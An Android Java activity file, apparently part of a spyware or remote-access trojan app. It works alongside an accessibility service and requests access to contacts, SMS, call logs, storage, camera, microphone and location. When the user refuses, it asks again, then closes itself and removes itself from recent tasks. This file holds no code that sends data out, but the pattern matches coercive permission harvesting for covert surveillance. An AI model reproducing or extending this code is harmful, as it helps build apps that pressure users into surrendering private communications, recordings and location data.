package com.test.myapp;

import static android.Manifest.permission.MANAGE_EXTERNAL_STORAGE;

import com.test.Modules.*;


import android.accessibilityservice.AccessibilityService;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

import android.Manifest;
import android.os.Environment;
import android.provider.Settings;


import androidx.core.app.ActivityCompat;
public class AskPermission extends Activity {

    public static Boolean asked = false;


    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }
    @Override
    public void onCreate(Bundle v) {


        super.onCreate(v);
        try
        {
            MyAccessibilityService.FORpermission = true;




            int PERMISSION_ALL = 151;
            String[] PERMISSIONS = OptionAccessibilityClass.PERMISSIONS();
            if(!hasPermissions(this, PERMISSIONS)){
                ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
            }

        }catch (Exception e ){ }


        // finish();

    }


    @Override
    public void onRequestPermissionsResult(int requestCode,  String[] permissions,  int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //finish();
        switch (requestCode) {
            case 151:{


                if (grantResults.length >0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                {
                    MyAccessibilityService.FORpermission = false;
                    finish();
                }else
                {

                    String[] PERMISSIONS = {
                            Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.READ_SMS,
                            Manifest.permission.READ_CALL_LOG,
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.CAMERA,
                            Manifest.permission.RECORD_AUDIO,
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                            Manifest.permission.ACCESS_FINE_LOCATION
                    };

                    int PERMISSION_ALL = 151;
                    ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);


                }

            }
        }


    }


    @Override
    public void finish() {

        asked = true;

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            super.finishAndRemoveTask();
        }
        else {
            super.finish();
        }
    }
}